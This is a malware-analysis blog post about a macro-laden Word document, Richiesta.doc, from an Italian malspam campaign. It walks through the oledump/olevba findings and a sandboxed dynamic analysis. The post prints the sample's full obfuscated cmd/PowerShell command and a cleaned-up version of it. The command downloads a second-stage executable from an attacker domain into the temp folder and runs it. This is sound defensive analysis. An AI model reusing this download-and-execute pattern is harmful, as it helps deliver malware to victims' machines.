---
layout: post
title: "Analysis of a malicious Word document"
description: "Analysis of a malicious Word document"
date: 2018-02-05
tags: malware
show_social: true
comments: true
---

Analysis of a malicious Word document used to deliver malware via a malspam campaign.

<!--more-->

The sample I'm going to analyze is a Microsoft Word document distributed via malspam.

As we will see it acts as a _downloader_ that once executed reaches out to the Internet and downloads its second stage. Unfortunately at the time of this analysis the contacted domain was already dead. Nevertheless I found interesting to complete this analysis.

The sample is named `Richiesta.doc` and its SHA256 hash is `586b7dbe2a700e50a9dda9a9e12bd985e54dc5b1b7a77a61450d638358133d3f`.

It is reported as malicious by VirusTotal (and other online sandboxes), and it's worth noting that there are many different malicious samples of `Richiesta.doc` in th wild each one with a different hash.

I will start playing with the sample on my REMnux lab virtual machine.

Examining the file with the `file` utility confirms it is a Microsoft Word document:

```
remnux@remnux:~/ex$ file Richiesta.doc
Richiesta.doc: Composite Document File V2 Document, Little Endian, Os: Windows,
Version 6.1, Code page: 1251, Template: Normal.dotm, Last Saved By: admin,
Revision Number: 2, Name of Creating Application: Microsoft Office Word,
Create Time/Date: Mon Jan 29 21:20:00 2018, Last Saved Time/Date: Mon Jan 29 21:20:00 2018,
Number of Pages: 1, Number of Words: 0, Number of Characters: 1, Security: 0
```

Let's further examine it with the [Didier Stevens](https://blog.didierstevens.com/) `oledump` tool:

```
remnux@remnux:~/ex$ oledump.py Richiesta.doc
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7427 '1Table'
  5:     60355 'Data'
  6:       496 'Macros/PROJECT'
  7:       122 'Macros/PROJECTwm'
  8: M    8163 'Macros/VBA/ThisDocument'
  9: M   14893 'Macros/VBA/Wct7kKdi5'
 10:      7570 'Macros/VBA/_VBA_PROJECT'
 11:      1786 'Macros/VBA/__SRP_0'
 12:       198 'Macros/VBA/__SRP_1'
 13:       532 'Macros/VBA/__SRP_2'
 14:       156 'Macros/VBA/__SRP_3'
 15:       671 'Macros/VBA/dir'
 16: M    8038 'Macros/VBA/tVQSqmk'
 17: M   19011 'Macros/VBA/yBcakFpM'
 18:      4096 'WordDocument'
```

As expected, those three streams marked with an `M` mean that this Word document contains Macros. I can read the Macros after decompressing the VBA stream with `oledump.py -s 8 -v Richiesta.doc` (where `8` is the number of the stream I want to decompress). Unfortunately the code looks heavily obfuscated.

Let's make a run with the `olevba` tool (from the [oletools](http://decalage.info/python/oletools) package):

```
remnux@remnux:~/ex$ olevba Richiesta.doc
```

A couple of interesting keywords contained in the obfuscated code are:
* a function named `Document_Open`: that means that the Macro is run when the Word document is opened;
* a call to `VBA.Shell` : probably the Macro runs an executable file or a system command.

`olevba` does have an option to try deobfuscate the code, but it does not help much in this case.

Anyway I won't care about deobfuscating the code. Instead I will try to run the malware and observe what it does.

To perform basic dynamic analysis, I'm going to use two virtual machines: one is a Windows 8.1 VM, equipped with malware analysis tools, where I will detonate the malware; the other is the REMnux Lab VM which I will use to direct the network traffic to.

To monitor network activity:

* Set up [ApateDNS](https://www.fireeye.com/services/freeware/apatedns.html) on the Windows VM to intercept any DNS requests and have it reply with the IP address of the REMnux VM.
* Set up [INETsim](http://www.inetsim.org/) on the REMnux VM to simulate Internet services and Wireshark to sniff network traffic.
* I'm going to monitor network traffic with Wireshark on the Windows VM as well.

To monitor system activity on the Windows VM:

* Run [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) (or [Process Hacker](http://processhacker.sourceforge.net)).
* Run [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon).
* Run [Regshot](https://sourceforge.net/projects/regshot).

I'm letting those programs run and exclude normal activity from Process Monitor. Then, right before installing the malware, I'm taking the first shot with Regshot.

Let's now open the Word document!

Once opened, it shows a common social engineering trick to have the victim enable Macros; it says (in Italian): _This document is for an older version of Word. To visualize its content please click 'Enable' in the yellow bar above..._.

![word](/media/20180205/word.png)

(Btw, the yellow bar with the Enable button is not visible in my screenshot because I took the screenshot after having enabled the Macros.)

As Macros are activated, the malicious code starts performing its actions. It communicates with a remote server to download a file (its second stage) which is saved under a temporary directory and then executed.

The domain contacted is `wijdqwbntuqwebqweqwizxc[.]com` as apparent from the ApateDNS log:

![apatedns](/media/20180205/apatedns.png)

Wireshark shows us the full URL where the second stage is downloaded from:

`hxxp://wijdqwbntuqwebqweqwizxc[.]com/stata/index.php?rnd=59978`

![wireshark](/media/20180205/wireshark.png)

It's worth noting that the `User-Agent` string is `15.0`: we'll see shortly that this corresponds to the version of Microsoft Word.

Taking the second shot with RegShot and comparing the results we can easily see that a new file has been created:

```
C:\Users\REM\AppData\Local\Temp\19982.exe
```

In this case the malware could not reach out to the Internet but only to the REMnux VM where INETsim was running; indeed the downloaded file contains the fake HTTP response sent by INETsim.

We can further examine what happened on the system using Process Monitor: we see that the Macros executed a system command `cmd` which in turn called the `powershell` executable to connect to the remote server and download the second stage. In the screenshot below only the events having `Operation` equal to any of `Process Start`, `WriteFile` or `TCP Connect` are shown.

![commandline](/media/20180205/commandline.png)

The full command line (highlighted in the screenshot) is:

```
cmd /c set _a1=pow&& set _a2=ersh&& set _a3=ell&& call %_a1%%_a2%%_a3% $ULjzHtTrs = 'iRJKbn';$jmVo2G = new-object System.Net.WebClient;$DSTFdKxX1 = 'oth1DC';$LyXjIuhD = (New-Object -ComObject word.application).version;$SQYyU = 'xZeKFX';$jmVo2G.headers['user-agent'] = $LyXjIuhD;$NZVXzNr0 = 'ynMSJ';$LyXjIuhD.close();$mNRwMHq = 'b85KGdV67';$LyXjIuhD.quit;$qdsyJ = 'hXUwA7Vo';$JNcVeBxf = $env:temp + '\19982.exe';$KVRjd8Y = 'G9WjeFT';foreach($mBbRidWu in 'http://wijdqwbntuqwebqweqwizxc.com/stata/index.php?rnd=59978,?rnd=59978,?rnd=59978,?rnd=59978,?rnd=59978'.Split(',')){try{$uV3RLeIz = 'pMP6bKdGA';$jmVo2G.DownloadFile($mBbRidWu.ToString(), $JNcVeBxf);$HfVyAwt = 'D1HxGK8T';Start-Process $JNcVeBxf;$Cv31ashE = 'RLpG0dl2';break;}catch{$LlX4G = 'qIpqLRP3';}$qSK6tDU = 'fMY4dFcJ';}
```

This is somewhat confusing to read... but not so much if we clean it up a little bit.

Following is a _manually-decoded_ version of the command line just to make it easier to read. I wrote it on different lines and replaced the original names of important variables with more meaningful names.


```
cmd /c
set _a1=pow&& set _a2=ersh&& set _a3=ell
&&
call %_a1%%_a2%%_a3%
$ULjzHtTrs = 'iRJKbn';
$connection = new-object System.Net.WebClient;
$DSTFdKxX1 = 'oth1DC';
$word = (New-Object -ComObject word.application).version;
$SQYyU = 'xZeKFX';
$connection.headers['user-agent'] = $word;
$NZVXzNr0 = 'ynMSJ';
$word.close();
$mNRwMHq = 'b85KGdV67';
$word.quit;
$qdsyJ = 'hXUwA7Vo';
$malware = C:\Users\REM\AppData\Local\Temp\19982.exe';
$KVRjd8Y = 'G9WjeFT';
foreach($url in 'http://wijdqwbntuqwebqweqwizxc.com/stata/index.php?rnd=59978,?rnd=59978,?rnd=59978,?rnd=59978,?rnd=59978'.Split(',')) {
    try{
        $uV3RLeIz = 'pMP6bKdGA';
        $connection.DownloadFile($url.ToString(), $malware);
        $HfVyAwt = 'D1HxGK8T';
        Start-Process $malware;
        $Cv31ashE = 'RLpG0dl2';
        break;
    }
    catch{
        $LlX4G = 'qIpqLRP3';
    }
    $qSK6tDU = 'fMY4dFcJ';
}
```

The first line is a call to `cmd /c` to execute the command that follows. The second line sets three environment variables, which are then concatenated on line 5 into the string `powershell` which is the argument of the command `call`.

Following down the lines we see how a `WebClient` object is created (I renamed it to `$connection`); how the Microsoft Word version is read and assigned to the `user-agent` property of the `$connection` object; how the path where the second stage malware is to be saved to is set. The `foreach` loop is where the actual download happens. Note that the loop is executed only one time because of the `break` instruction and regardless of how many `$urls` are obtained from the `Split` operation. Indeed the `Split` and all those other random strings assignments spread over are just garbage to make the code more difficult to read and reverse.

I tried to download the second stage using [Malzilla](http://malzilla.sourceforge.net/) but unfortunately without success: at this time the domain is dead or already taken down.

![virustracker](/media/20180205/virustracker.png)

That's all!
